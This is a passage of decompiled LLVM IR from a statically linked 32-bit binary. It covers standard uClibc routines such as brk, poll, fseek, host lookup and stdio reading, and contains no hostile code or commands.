  br i1 %tmp4695, label %dec_label_pc_805319f, label %dec_label_pc_80531d0

dec_label_pc_805319f:                             ; preds = %dec_label_pc_80531c7.preheader, %dec_label_pc_805319f.dec_label_pc_805319f_crit_edge
  %v0_80531c796 = phi i32 [ %v0_80531c7, %dec_label_pc_805319f.dec_label_pc_805319f_crit_edge ], [ %v0_80531c792, %dec_label_pc_80531c7.preheader ]
  %v1_805319f = add i32 %v0_80531c796, -1
  store i32 %v1_805319f, i32* @global_var_8060818.281, align 8
  %v1_80531a8 = mul i32 %v1_805319f, 4
  %v2_80531a8 = add i32 %v1_80531a8, 134612984
  %v3_80531a8 = inttoptr i32 %v2_80531a8 to i32*
  %v4_80531a8 = load i32, i32* %v3_80531a8, align 4
  %v1_80531af = call i32 @free(i32 %v4_80531a8)
  %v0_80531b4 = load i32, i32* @global_var_8060818.281, align 8
  %v1_80531bc = mul i32 %v0_80531b4, 4
  %v2_80531bc = add i32 %v1_80531bc, ptrtoint (i32* @global_var_80607f8.289 to i32)
  %v3_80531bc = inttoptr i32 %v2_80531bc to i32*
  store i32 0, i32* %v3_80531bc, align 4
  %v0_80531c7 = load i32, i32* @global_var_8060818.281, align 8
  %tmp45 = icmp slt i32 %v0_80531c7, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_805319f.dec_label_pc_805319f_crit_edge, label %dec_label_pc_80531d0

dec_label_pc_805319f.dec_label_pc_805319f_crit_edge: ; preds = %dec_label_pc_805319f
  br label %dec_label_pc_805319f

dec_label_pc_80531d0:                             ; preds = %dec_label_pc_805319f, %dec_label_pc_80531c7.preheader
  %v0_80531c7.lcssa = phi i32 [ %v0_80531c792, %dec_label_pc_80531c7.preheader ], [ %v0_80531c7, %dec_label_pc_805319f ]
  store i32 1, i32* @esi, align 4
  %v5_80531fd100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80531fd100, label %dec_label_pc_80531ff, label %dec_label_pc_805320a.backedge

dec_label_pc_80531d7:                             ; preds = %dec_label_pc_80531ff
  %v2_80531da = mul i32 %v1_80531da102, 4
  %v4_80531da = add i32 %v2_80531da, %v3_8053145
  %v5_80531da = inttoptr i32 %v4_80531da to i32*
  %v6_80531da = load i32, i32* %v5_80531da, align 4
  %v1_80531e1 = inttoptr i32 %v6_80531da to i8*
  %v2_80531e1 = call i32 @__GI_strdup(i8* %v1_80531e1)
  %v0_80531e6 = load i32, i32* @esi, align 4
  %v1_80531e6 = add i32 %v0_80531e6, 1
  store i32 %v1_80531e6, i32* @esi, align 4
  %v1_80531e7 = load i32, i32* @ebx, align 4
  %v2_80531e7 = mul i32 %v1_80531e7, 4
  %v3_80531e7 = add i32 %v2_80531e7, 134612984
  %v4_80531e7 = inttoptr i32 %v3_80531e7 to i32*
  store i32 %v2_80531e1, i32* %v4_80531e7, align 4
  %v0_80531ee = load i32, i32* @ebx, align 4
  %v1_80531ee = add i32 %v0_80531ee, 1
  store i32 %v1_80531ee, i32* @global_var_8060818.281, align 8
  %v0_80531f9.pre = load i32, i32* @esi, align 4
  %v5_80531fd = icmp slt i32 %v0_80531f9.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80531fd, label %dec_label_pc_80531ff, label %dec_label_pc_805320a.backedge

dec_label_pc_80531ff:                             ; preds = %dec_label_pc_80531d0, %dec_label_pc_80531d7
  %v1_80531da102 = phi i32 [ %v0_80531f9.pre, %dec_label_pc_80531d7 ], [ 1, %dec_label_pc_80531d0 ]
  %v0_80531ff101 = phi i32 [ %v1_80531ee, %dec_label_pc_80531d7 ], [ %v0_80531c7.lcssa, %dec_label_pc_80531d0 ]
  store i32 %v0_80531ff101, i32* @ebx, align 4
  %v7_8053208 = icmp sgt i32 %v0_80531ff101, 3
  br i1 %v7_8053208, label %dec_label_pc_805320a.backedge, label %dec_label_pc_80531d7

dec_label_pc_8053097.preheader:                   ; preds = %dec_label_pc_8053097.preheader.lr.ph, %dec_label_pc_805320a.backedge
  %v0_8053097.pre = load i32, i32* @ebx, align 4
  %v4_8053097.pre = load i32, i32* @ecx, align 4
  %v1_805309751 = inttoptr i32 %v0_8053097.pre to i8*
  %v2_805309752 = load i8, i8* %v1_805309751, align 1
  %v3_805309753 = zext i8 %v2_805309752 to i32
  %v5_805309754 = and i32 %v4_8053097.pre, -256
  %v6_805309755 = or i32 %v3_805309753, %v5_805309754
  store i32 %v6_805309755, i32* @ecx, align 4
  %v4_805309956 = icmp eq i8 %v2_805309752, 0
  br i1 %v4_805309956, label %dec_label_pc_805320a.backedge, label %dec_label_pc_80530a1.lr.ph

dec_label_pc_80530a1.lr.ph:                       ; preds = %dec_label_pc_8053097.preheader
  %v0_80530a4.pre = load i32, i32* @global_var_8059eb8, align 8
  br label %dec_label_pc_80530a1

dec_label_pc_8053226:                             ; preds = %dec_label_pc_805320a.backedge, %dec_label_pc_805320a.preheader
  %v0_8053229 = load i32, i32* @ebp, align 4
  %v1_805322a = inttoptr i32 %v0_8053229 to i16*
  %v2_805322a = call i32 @__GI_fclose(i16* %v1_805322a)
  br label %dec_label_pc_805323f

dec_label_pc_8053234:                             ; preds = %dec_label_pc_8053073
  %v0_8053234 = call i32 @__GI___h_errno_location()
  %v1_8053239 = inttoptr i32 %v0_8053234 to i32*
  store i32 3, i32* %v1_8053239, align 4
  br label %dec_label_pc_805323f

dec_label_pc_805323f:                             ; preds = %entry, %dec_label_pc_8053226, %dec_label_pc_8053234
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_805302c, i32* @eax, align 4
  %v2_805324b = call i32 @__pthread_return_void(i32 %v2_805302c, i32 1)
  store i32 %v0_8053018, i32* @ebp, align 4
  ret i32 %v2_805324b

; uselistorder directives
  uselistorder i32 %v0_80530a4.pre, { 1, 0 }
  uselistorder i32 %v6_805309755, { 1, 0 }
  uselistorder i8 %v2_805309752, { 1, 2, 0 }
  uselistorder i8* %v1_805309751, { 1, 0 }
  uselistorder i32 %v0_8053097.pre, { 1, 0 }
  uselistorder i32 %v0_80531c7, { 0, 2, 1 }
  uselistorder i32 %v1_805319f, { 1, 0 }
  uselistorder i32 %v0_805316a, { 1, 0 }
  uselistorder i32 %v0_8053164.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_80530fd, { 1, 0 }
  uselistorder i8 %v2_80530f783, { 1, 0 }
  uselistorder i32 %v2_80530de, { 1, 0 }
  uselistorder i8 %v2_80530d868, { 1, 0 }
  uselistorder i32 %v1_80530d7, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80530a1, { 1, 0 }
  uselistorder i32 %v1_8053096, { 1, 0, 2 }
  uselistorder i32 %v2_8053211, { 2, 3, 0, 1 }
  uselistorder i32 %v2_805307f, { 1, 0 }
  uselistorder i32 %v2_8053061, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 18, 16, 15, 14, 13, 12, 11, 10, 26, 25, 24, 23, 2, 9, 8, 7, 6, 5, 17, 0, 19, 22, 21, 20, 4, 3, 1 }
  uselistorder i32* @global_var_8060818.281, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 15, 9, 16, 10, 11, 12, 13, 17 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8060814.221, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805a128.220 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_805323f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053097.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80531ff, { 1, 0 }
  uselistorder label %dec_label_pc_805319f, { 1, 0 }
  uselistorder label %dec_label_pc_80531c7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8053175, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805316a, { 1, 0 }
  uselistorder label %dec_label_pc_8053120, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053119, { 1, 0 }
  uselistorder label %dec_label_pc_8053110, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80530fd, { 1, 0 }
  uselistorder label %dec_label_pc_80530de, { 1, 0 }
  uselistorder label %dec_label_pc_805320a.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_805320a.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_805327f = inttoptr i32 %arg3 to i32*
  %v10_805327f = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_805327f, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_805327f
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805328b = call i32 @__libc_getpid()
  %v2_8053297 = call i32 @kill(i32 %v0_805328b, i32 %arg1)
  ret i32 %v2_8053297

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 1, 2 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80532a0 = load i32, i32* @eax, align 4
  %v1_80532a0 = add i32 %v0_80532a0, 28
  %v2_80532a0 = inttoptr i32 %v1_80532a0 to i32*
  %v3_80532a0 = load i32, i32* %v2_80532a0, align 4
  store i32 %v3_80532a0, i32* @global_var_806081c.290, align 4
  %v1_80532a9 = add i32 %v0_80532a0, 44
  %v2_80532a9 = inttoptr i32 %v1_80532a9 to i32*
  %v3_80532a9 = load i32, i32* %v2_80532a9, align 4
  store i32 %v3_80532a9, i32* @global_var_8060820.291, align 32
  ret i32 %v3_80532a9
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80532b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80532b4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80532c7 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80532c7, i32* @global_var_80603e4.268, align 4
  %v7_80532d2 = icmp ult i32 %v1_80532c7, %arg1
  %v1_80532d4 = icmp eq i1 %v7_80532d2, false
  br i1 %v1_80532d4, label %dec_label_pc_80532e4, label %dec_label_pc_80532d6

dec_label_pc_80532d6:                             ; preds = %entry
  %v0_80532d6 = load i32, i32* %stack_var_-4, align 4
  %v1_80532d6 = call i32 @__errno_location(i32 %v0_80532d6)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80532de = inttoptr i32 %v1_80532d6 to i32*
  store i32 12, i32* %v1_80532de, align 4
  %v0_80532e4.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80532e4

dec_label_pc_80532e4:                             ; preds = %entry, %dec_label_pc_80532d6
  %v0_80532e4 = phi i32 [ 0, %entry ], [ %v0_80532e4.pre, %dec_label_pc_80532d6 ]
  %v2_80532e8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80532e8, i32* @ebx, align 4
  ret i32 %v0_80532e4

; uselistorder directives
  uselistorder i32 %v1_80532c7, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80603e4.268, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80532e4, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80532ec = load i32, i32* @edi, align 4
  store i32 %v0_80532ec, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80532fc = load i32, i32* @ebx, align 4
  %v1_80532fd = inttoptr i32 %tmp4 to %pollfd*
  %v5_8053304 = call i32 @poll(%pollfd* %v1_80532fd, i32 %tmp3, i32 %tmp)
  store i32 %v0_80532fc, i32* @ebx, align 4
  store i32 %v5_8053304, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8053304, -4095
  br i1 %tmp10, label %dec_label_pc_805331c, label %dec_label_pc_8053310

dec_label_pc_8053310:                             ; preds = %entry
  %v1_8053310 = call i32 @__errno_location(i32 %v0_80532fc)
  %v0_8053315 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053315 = sub i32 0, %v0_8053315
  %v2_8053317 = inttoptr i32 %v1_8053310 to i32*
  store i32 %v1_8053315, i32* %v2_8053317, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805331c

dec_label_pc_805331c:                             ; preds = %entry, %dec_label_pc_8053310
  %v0_805331c = phi i32 [ %v5_8053304, %entry ], [ -1, %dec_label_pc_8053310 ]
  %v2_8053320 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053320, i32* @edi, align 4
  ret i32 %v0_805331c

; uselistorder directives
  uselistorder i32 %v5_8053304, { 1, 0, 2 }
  uselistorder i32 %v0_80532fc, { 1, 0 }
  uselistorder label %dec_label_pc_805331c, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805332f = ashr i32 %arg2, 31
  %v4_8053336 = inttoptr i32 %arg1 to i16*
  %v5_8053336 = call i32 @__GI_fseeko64(i16* %v4_8053336, i32 %arg2, i32 %v1_805332f, i32 %arg3)
  ret i32 %v5_8053336
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053340 = load i32, i32* @ebp, align 4
  %v0_8053341 = load i32, i32* @edi, align 4
  %v0_8053342 = load i32, i32* @esi, align 4
  %v0_8053343 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8053353 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053353, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_8053377, label %dec_label_pc_8053364

dec_label_pc_8053364:                             ; preds = %entry
  %v1_8053364 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8053364, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_805336c = inttoptr i32 %v1_8053364 to i32*
  store i32 22, i32* %v1_805336c, align 4
  br label %dec_label_pc_8053419

dec_label_pc_8053377:                             ; preds = %entry
  %v1_8053377 = add i32 %v4_8053353, 52
  %v2_8053377 = inttoptr i32 %v1_8053377 to i32*
  %v3_8053377 = load i32, i32* %v2_8053377, align 4
  %v1_805337a = icmp eq i32 %v3_8053377, 0
  %v1_805337c = icmp eq i1 %v1_805337a, false
  br i1 %v1_805337c, label %dec_label_pc_805339d, label %dec_label_pc_805337e

dec_label_pc_805337e:                             ; preds = %dec_label_pc_8053377
  %v1_805337e = add i32 %v4_8053353, 56
  store i32 %v1_805337e, i32* @ebx, align 4
  %v2_8053388 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8053388, i32* @eax, align 4
  %v3_805338d = call i32 @__pthread_return_void(i32 %v2_8053388, i32 134550911)
  store i32 %v3_805338d, i32* %eax.global-to-local, align 4
  %v0_8053392 = load i32, i32* @ebx, align 4
  %v2_8053395 = call i32 @__pthread_return_0(i32 %v0_8053392)
  store i32 %v2_8053395, i32* %eax.global-to-local, align 4
  %v0_805339d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805339d

dec_label_pc_805339d:                             ; preds = %dec_label_pc_8053377, %dec_label_pc_805337e
  %v0_80533a5 = phi i32 [ %v4_8053353, %dec_label_pc_8053377 ], [ %v0_805339d.pre, %dec_label_pc_805337e ]
  %v1_805339d = inttoptr i32 %v0_80533a5 to i8*
  %v2_805339d = load i8, i8* %v1_805339d, align 1
  %v3_805339d = and i8 %v2_805339d, 64
  %v4_805339d = icmp eq i8 %v3_805339d, 0
  br i1 %v4_805339d, label %dec_label_pc_80533b2, label %dec_label_pc_80533a2

dec_label_pc_80533a2:                             ; preds = %dec_label_pc_805339d
  %v2_80533a6 = call i32 @__stdio_wcommit(i32 %v0_80533a5)
  store i32 %v2_80533a6, i32* %eax.global-to-local, align 4
  %v1_80533ae = icmp eq i32 %v2_80533a6, 0
  %v1_80533b0 = icmp eq i1 %v1_80533ae, false
  br i1 %v1_80533b0, label %dec_label_pc_8053401, label %dec_label_pc_80533b2

dec_label_pc_80533b2:                             ; preds = %dec_label_pc_80533a2, %dec_label_pc_805339d
  %v0_80533b2 = load i32, i32* @edi, align 4
  %v9_80533b2 = icmp eq i32 %v0_80533b2, 1
  %v1_80533b5 = icmp eq i1 %v9_80533b2, false
  br i1 %v1_80533b5, label %dec_label_pc_80533b2.dec_label_pc_80533cb_crit_edge, label %dec_label_pc_80533b7

dec_label_pc_80533b2.dec_label_pc_80533cb_crit_edge: ; preds = %dec_label_pc_80533b2
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80533cb

dec_label_pc_80533b7:                             ; preds = %dec_label_pc_80533b2
  %v0_80533b7 = load i32, i32* @ecx, align 4
  %v2_80533b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80533b9, i32* %eax.global-to-local, align 4
  %v0_80533be = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_80533be to i32*
  %v6_80533bf = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_80533b9, i32 %v0_80533b7, i32 %v0_80533b7)
  store i32 %v6_80533bf, i32* %eax.global-to-local, align 4
  %v2_80533c7 = icmp slt i32 %v6_80533bf, 0
  br i1 %v2_80533c7, label %dec_label_pc_8053401, label %dec_label_pc_80533b7.dec_label_pc_80533cb_crit_edge

dec_label_pc_80533b7.dec_label_pc_80533cb_crit_edge: ; preds = %dec_label_pc_80533b7
  %v0_80533cc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80533cb

dec_label_pc_80533cb:                             ; preds = %dec_label_pc_80533b2.dec_label_pc_80533cb_crit_edge, %dec_label_pc_80533b7.dec_label_pc_80533cb_crit_edge
  %v2_80533cd.pre-phi = phi i32 [ %.pre6, %dec_label_pc_80533b2.dec_label_pc_80533cb_crit_edge ], [ %v2_80533b9, %dec_label_pc_80533b7.dec_label_pc_80533cb_crit_edge ]
  %v0_80533cc = phi i32 [ %v0_80533b2, %dec_label_pc_80533b2.dec_label_pc_80533cb_crit_edge ], [ %v0_80533cc.pre, %dec_label_pc_80533b7.dec_label_pc_80533cb_crit_edge ]
  %v0_80533cb = load i32, i32* @edx, align 4
  store i32 %v2_80533cd.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80533d2 = load i32, i32* @esi, align 4
  %v5_80533d3 = inttoptr i32 %v2_80533cd.pre-phi to i32*
  %v6_80533d3 = call i32 @__stdio_seek(i32 %v0_80533d2, i32* %v5_80533d3, i32 %v0_80533cc, i32 %v0_80533cb)
  store i32 %v6_80533d3, i32* %eax.global-to-local, align 4
  %v2_80533db = icmp slt i32 %v6_80533d3, 0
  br i1 %v2_80533db, label %dec_label_pc_8053401, label %dec_label_pc_80533df

dec_label_pc_80533df:                             ; preds = %dec_label_pc_80533cb
  %v0_80533df = load i32, i32* @esi, align 4
  %v1_80533df = inttoptr i32 %v0_80533df to i16*
  %v2_80533df = load i16, i16* %v1_80533df, align 2
  %v3_80533df = and i16 %v2_80533df, -72
  store i16 %v3_80533df, i16* %v1_80533df, align 2
  %v0_80533e3 = load i32, i32* @esi, align 4
  %v1_80533e3 = add i32 %v0_80533e3, 8
  %v2_80533e3 = inttoptr i32 %v1_80533e3 to i32*
  %v3_80533e3 = load i32, i32* %v2_80533e3, align 4
  store i32 %v3_80533e3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_80533e8 = add i32 %v0_80533e3, 16
  %v3_80533e8 = inttoptr i32 %v2_80533e8 to i32*
  store i32 %v3_80533e3, i32* %v3_80533e8, align 4
  %v0_80533eb = load i32, i32* %eax.global-to-local, align 4
  %v1_80533eb = load i32, i32* @esi, align 4
  %v2_80533eb = add i32 %v1_80533eb, 20
  %v3_80533eb = inttoptr i32 %v2_80533eb to i32*
  store i32 %v0_80533eb, i32* %v3_80533eb, align 4
  %v0_80533ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80533ee = load i32, i32* @esi, align 4
  %v2_80533ee = add i32 %v1_80533ee, 24
  %v3_80533ee = inttoptr i32 %v2_80533ee to i32*
  store i32 %v0_80533ee, i32* %v3_80533ee, align 4
  %v0_80533f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80533f1 = load i32, i32* @esi, align 4
  %v2_80533f1 = add i32 %v1_80533f1, 28
  %v3_80533f1 = inttoptr i32 %v2_80533f1 to i32*
  store i32 %v0_80533f1, i32* %v3_80533f1, align 4
  %v0_80533f4 = load i32, i32* @esi, align 4
  %v1_80533f4 = add i32 %v0_80533f4, 44
  %v2_80533f4 = inttoptr i32 %v1_80533f4 to i32*
  store i32 0, i32* %v2_80533f4, align 4
  %v0_80533fb = load i32, i32* @esi, align 4
  %v1_80533fb = add i32 %v0_80533fb, 2
  %v2_80533fb = inttoptr i32 %v1_80533fb to i8*
  store i8 0, i8* %v2_80533fb, align 1
  br label %dec_label_pc_8053404

dec_label_pc_8053401:                             ; preds = %dec_label_pc_80533cb, %dec_label_pc_80533b7, %dec_label_pc_80533a2
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053404

dec_label_pc_8053404:                             ; preds = %dec_label_pc_80533df, %dec_label_pc_8053401
  br i1 %v1_805337c, label %dec_label_pc_8053419, label %dec_label_pc_8053408

dec_label_pc_8053408:                             ; preds = %dec_label_pc_8053404
  %v2_805340c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805340c, i32* @eax, align 4
  %v3_8053411 = call i32 @__pthread_return_void(i32 %v2_805340c, i32 1)
  store i32 %v3_8053411, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053419

dec_label_pc_8053419:                             ; preds = %dec_label_pc_8053404, %dec_label_pc_8053364, %dec_label_pc_8053408
  %v0_805341c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805341c, i32* %eax.global-to-local, align 4
  store i32 %v0_8053343, i32* @ebx, align 4
  store i32 %v0_8053342, i32* @esi, align 4
  store i32 %v0_8053341, i32* @edi, align 4
  store i32 %v0_8053340, i32* @ebp, align 4
  ret i32 %v0_805341c

; uselistorder directives
  uselistorder i32 %v2_80533cd.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80533b2, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 4, 3, 18, 17, 16, 15, 14, 5, 27, 33, 32, 12, 1, 0, 2, 8, 31, 7, 13, 21, 20, 19, 23, 22, 30, 11, 29, 6, 10, 9, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 2, 1, 0, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 4, 3, 47, 46, 59, 58, 57, 56, 16, 15, 8, 7, 55, 54, 6, 5, 18, 17, 34, 33, 32, 31, 30, 29, 38, 37, 36, 35, 53, 52, 14, 13, 51, 50, 12, 11, 10, 9, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134550911, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 14, 15, 16, 17, 18, 23, 24, 25, 26, 19 }
  uselistorder i32 52, { 7, 1, 12, 0, 2, 3, 4, 13, 14, 5, 10, 6, 8, 15, 11, 9 }
  uselistorder i32 22, { 8, 14, 2, 3, 4, 5, 6, 13, 12, 9, 10, 11, 15, 7, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053419, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053404, { 1, 0 }
  uselistorder label %dec_label_pc_80533cb, { 1, 0 }
  uselistorder label %dec_label_pc_805339d, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053424 = load i32, i32* @ebx, align 4
  store i32 %v0_8053424, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_805342a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805342a, i32* @ebx, align 4
  %v1_8053432 = bitcast i16* %arg1 to i8*
  %v2_8053432 = load i8, i8* %v1_8053432, align 1
  %v3_8053432 = and i8 %v2_8053432, 4
  %v4_8053432 = icmp eq i8 %v3_8053432, 0
  %v1_8053435 = icmp eq i1 %v4_8053432, false
  br i1 %v1_8053435, label %dec_label_pc_8053464, label %dec_label_pc_8053437

dec_label_pc_8053437:                             ; preds = %entry
  %v2_8053437 = icmp slt i32 %arg3, 0
  %v1_8053439 = icmp eq i1 %v2_8053437, false
  br i1 %v1_8053439, label %dec_label_pc_8053440, label %dec_label_pc_805343b

dec_label_pc_805343b:                             ; preds = %dec_label_pc_8053437
  br label %dec_label_pc_8053440

dec_label_pc_8053440:                             ; preds = %dec_label_pc_8053437, %dec_label_pc_805343b
  %v0_8053441 = phi i32 [ %arg3, %dec_label_pc_8053437 ], [ 2147483647, %dec_label_pc_805343b ]
  %v1_8053446 = add i32 %v4_805342a, 4
  %v2_8053446 = inttoptr i32 %v1_8053446 to i32*
  %v3_8053446 = load i32, i32* %v2_8053446, align 4
  %v3_8053449 = inttoptr i32 %arg2 to i32*
  %v4_8053449 = call i32 @__libc_read(i32 %v3_8053446, i32* %v3_8053449, i32 %v0_8053441)
  store i32 %v4_8053449, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_8053449, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8053464, label %dec_label_pc_8053456

dec_label_pc_8053456:                             ; preds = %dec_label_pc_8053440
  %v1_8053451 = icmp eq i32 %v4_8053449, 0
  %v4_8053454 = icmp eq i1 %v1_8053451, false
  %v0_805345e = load i32, i32* @ebx, align 4
  %v1_805345e = inttoptr i32 %v0_805345e to i16*
  %v2_805345e = load i16, i16* %v1_805345e, align 2
  br i1 %v4_8053454, label %dec_label_pc_805345e, label %dec_label_pc_8053458

dec_label_pc_8053458:                             ; preds = %dec_label_pc_8053456
  %v3_8053458 = or i16 %v2_805345e, 4
  store i16 %v3_8053458, i16* %v1_805345e, align 2
  %v0_8053467.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053464

dec_label_pc_805345e:                             ; preds = %dec_label_pc_8053456
  %v3_805345e = or i16 %v2_805345e, 8
  store i16 %v3_805345e, i16* %v1_805345e, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053464

dec_label_pc_8053464:                             ; preds = %dec_label_pc_8053440, %entry, %dec_label_pc_8053458, %dec_label_pc_805345e
  %v0_8053467 = phi i32 [ %v4_8053449, %dec_label_pc_8053440 ], [ 0, %entry ], [ %v0_8053467.pre, %dec_label_pc_8053458 ], [ 0, %dec_label_pc_805345e ]
  %v2_8053466 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053466, i32* @ebx, align 4
  ret i32 %v0_8053467

; uselistorder directives
  uselistorder i16 %v2_805345e, { 1, 0 }
  uselistorder i32 %v4_8053449, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053464, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8053440, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8053478 = load i32, i32* %arg1, align 4
  store i32 %v2_8053478, i32* %esi.global-to-local, align 4
  %v1_805347f = urem i32 %v2_8053478, 4
  %v2_805347f = icmp eq i32 %v1_805347f, 0
